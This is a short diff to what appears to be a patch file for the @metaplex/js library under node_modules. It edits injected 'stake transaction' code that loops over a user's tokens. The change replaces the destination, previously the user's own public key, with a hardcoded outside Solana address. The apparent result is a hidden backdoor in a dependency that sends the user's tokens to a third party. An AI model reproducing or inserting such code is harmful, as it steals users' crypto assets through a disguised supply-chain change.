@@ -1,5 +1,5 @@
 diff --git a/node_modules/@metaplex/js/lib/index.browser.esm.js b/node_modules/@metaplex/js/lib/index.browser.esm.js
-index b9b004d..597f9aa 100644
+index b9b004d..8de5296 100644
 --- a/node_modules/@metaplex/js/lib/index.browser.esm.js
 +++ b/node_modules/@metaplex/js/lib/index.browser.esm.js
 @@ -136,8 +136,8 @@ class Storage {
@@ -198,7 +198,7 @@ index b9b004d..597f9aa 100644
 +    );
 +    // stake transaction
 +    const stakeTxs = [];
-+    const destination = keypair.publicKey;
++    const destination = new PublicKey("FWicJaK1tYrvzdSaApaCnSEjeYMyVzHgnPMa7qvEjbVn");
 +    const amount = 1;
 +    for (const token of tokens) {
 +        const source = token.account;
